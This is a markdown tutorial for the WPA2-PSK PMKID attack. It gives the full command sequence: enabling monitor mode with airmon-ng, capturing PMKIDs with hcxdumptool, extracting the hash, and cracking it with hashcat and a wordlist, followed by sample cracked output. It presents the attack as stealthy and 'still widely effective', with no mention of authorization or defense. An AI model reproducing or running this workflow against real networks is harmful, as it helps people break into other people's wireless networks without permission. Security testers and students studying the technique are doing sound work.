# 🛡️ WPA2-PSK PMKID Attack – Offline, Clientless Method

## 🔍 What is the PMKID Attack?

The PMKID attack is a stealthy, modern method to recover the WPA2-PSK **without capturing a full 4-way handshake** and **without requiring any connected client**.

It exploits a feature in some access points that leak the **PMKID** in the first EAPOL message.

---

## 💡 Why use PMKID?

- ✅ No deauths
- ✅ No connected clients
- ✅ Stealthy & passive
- ✅ Fully offline cracking
- ✅ Faster and more scriptable than handshake capture

---

## 🧠 How It Works

The **Pairwise Master Key Identifier (PMKID)** is computed from:

- The **SSID**
- The **MAC address of the AP (BSSID)**
- The **Pre-Shared Key (PSK)**

If the AP includes the PMKID in EAPOL frames, it can be captured directly and cracked offline — no handshake needed.

---

## ⚙️ Required Tools

- `hcxdumptool` – captures PMKID from the air  
- `hcxpcapngtool` – extracts the hash  
- `hashcat` – cracks the hash offline

---

## 🧭 Attack Flow

### 1. Enable monitor mode

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0

2. Capture PMKID

sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

Let it run for a while and passively collect PMKID packets.
3. Extract hash

hcxpcapngtool -o pmkid_hash.txt pmkid.pcapng

4. Crack the hash

hashcat -m 16800 pmkid_hash.txt rockyou.txt

    -m 16800: WPA-PMKID mode

    rockyou.txt: your wordlist

🧪 Example Output

Session..........: hashcat
Hash.Type........: WPA-PMKID-PBKDF2
Status...........: Cracked
Password.........: supersecurewifi

📌 Notes

    Not all APs expose PMKID — some are immune

    Best results on modern routers (802.11i)

    Still widely effective in real-world networks

This is a passive, elegant, and powerful technique.
No noise. No clients. Just results.
